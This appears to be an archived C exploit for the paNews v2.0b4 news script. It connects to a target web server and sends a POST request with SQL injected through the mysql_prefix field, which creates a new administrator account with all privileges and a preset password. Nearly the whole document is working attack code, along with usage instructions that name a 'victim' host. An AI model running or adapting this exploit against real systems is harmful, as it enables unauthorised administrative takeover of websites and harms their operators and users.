<html><head><title>paNews 2.0b4 Remote Admin Creation SQL Injection Exploit</title></head><pre>/***************************************************
*                                                  *
* paNews v2.0b4                                    *
*                                                  *
* silePNEWSxpl                                     *
* This exploit utilize SQL injection for create    *
* a new user with admin privileges on paNews       *
* software system.                                 *
*                                                  *
* References:                                      *
* packetstormsecurity.org/0503-exploits/panews.txt *
                         *
*                                                  *
* coded by: Silentium of Anacron Group Italy       *
*     date: 04/03/2005                             *
*   e-mail: anacrongroupitaly[at]autistici[dot]org *
*  my_home: www.autistici.org/anacron-group-italy  *
*                                                  *
* this tool is developed under GPL license         *
* no(c) .:. copyleft                               *
*                                                  *
***************************************************/

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;netdb.h&gt;

#define PORT 80                 // port of the web server

void info(void);
void sendxpl(int sock, char *argv[]);
void errsock(void);
void errgeth(void);
void errconn(void);

int main(int argc, char *argv[]){

int sock, sockconn;
struct sockaddr_in addr;
struct hostent *hp;

if(argc!=4)
  info();

if((sock = socket(AF_INET, SOCK_STREAM, 0)) &lt; 0)
  errsock();

system(&quot;clear&quot;);
printf(&quot;[*] Creating socket             [OK]\n&quot;);

if((hp = gethostbyname(argv[1])) == NULL)
  errgeth();

printf(&quot;[*] Resolving victim host       [OK]\n&quot;);

memset(&amp;addr,0,sizeof(addr));
memcpy((char *)&amp;addr.sin_addr,hp-&gt;h_addr,hp-&gt;h_length);
addr.sin_family = AF_INET;
addr.sin_port = htons(PORT);

sockconn = connect(sock,(struct sockaddr *)&amp;addr,sizeof(addr));
if(sockconn &lt; 0)
  errsock();

printf(&quot;[*] Connecting at victim host   [OK]\n&quot;);

sendxpl(sock, argv);

printf(&quot;[*] Now check on\n&quot;
      &quot;    http://%s%s\n\n&quot;
      &quot;    your username: %s\n&quot;
      &quot;    with password: anacron\n\n&quot;,argv[1],argv[2],argv[3]);

shutdown(sock, 2);
close(sock);

return(0);

}

void info(void){

system(&quot;clear&quot;);
printf(&quot;#########################################\n&quot;
      &quot;# paNews v2.0b4 exploit                 #\n&quot;
      &quot;#########################################\n&quot;
      &quot;# this exploit create a new user admin  #\n&quot;
      &quot;# on paNews software system.            #\n&quot;
      &quot;# exploit coded by Silentium            #\n&quot;
      &quot;# Anacron Group Italy                   #\n&quot;
      &quot;# www.autistici.org/anacron-group-italy #\n&quot;
      &quot;#########################################\n\n&quot;
      &quot;[usage]\n\n&quot;
      &quot; silePNEWSxpl &lt;victim&gt; &lt;path_paNews&gt; &lt;username&gt;\n\n&quot;
      &quot;[example]\n\n&quot;
      &quot; silePNEWSxpl www.victim.com /panews/index.php silentium\n\n&quot;);
exit(1);

}

void sendxpl(int sock, char *argv[]){

FILE *out;
int size = 264;
out = fdopen(sock,&quot;a&quot;);
setbuf(out,NULL);

size+=(strlen(argv[3]) * 2);

fprintf(out,&quot;POST %s HTTP/1.0\n&quot;
           &quot;Connection: Keep-Alive\n&quot;
           &quot;Pragma: no-cache\n&quot;
           &quot;Cache-control: no-cache\n&quot;
           &quot;Accept: text/html, image/jpeg, image/png, text/*, image/*, */*\n&quot;
           &quot;Accept-Encoding: x-gzip, x-deflate, gzip, deflate, identity\n&quot;
           &quot;Accept-Charset: iso-8859-1, utf-8;q=0.5, *;q=0.5\n&quot;
           &quot;Accept-Language: en\n&quot;
           &quot;Host: %s\n&quot;
           &quot;Referer: http://%s%s\n&quot;
           &quot;Content-Type: application/x-www-form-urlencoded\n&quot;
           &quot;Content-Length: %d\n\n&quot;
           &quot;action%%3Dlogin%%26username%%3D%s%%26password%%3Danacron%%26&quot;
           &quot;mysql_prefix%%3Dpanews_auth%%60%%20VALUES%%20(%%22%%22,%%22&quot;
           &quot;%s%%22,%%22f63140655b379e65f6cd87fa3c3da631%%22,%%22&quot;
           &quot;hackit%%22,%%22admins%%7Ccat%%7Ccomment%%7Cnewsadd%%7Cnewsedit&quot;
           &quot;%%7Cprefset%%7Csetup%%22,%%22none%%22,%%22127.0.0.1%%22&quot;
           &quot;,1,1)%%00\n\n&quot;,argv[2],argv[1],argv[1],argv[2],size,argv[3],argv[3]);

           printf(&quot;[*] Sending exploit         [OK]\n\n&quot;);

}

void errsock(void){

system(&quot;clear&quot;);
printf(&quot;[x] Creating socket             [FAILED]\n\n&quot;);
exit(1);

}

void errgeth(void){

printf(&quot;[x] Resolving victim host        [FAILED]\n\n&quot;);
exit(1);

}

void errconn(void){

printf(&quot;[x] Connecting at victim host    [FAILED]\n\n&quot;);
exit(1);

}

// milw0rm.com [2005-03-08]</pre></html>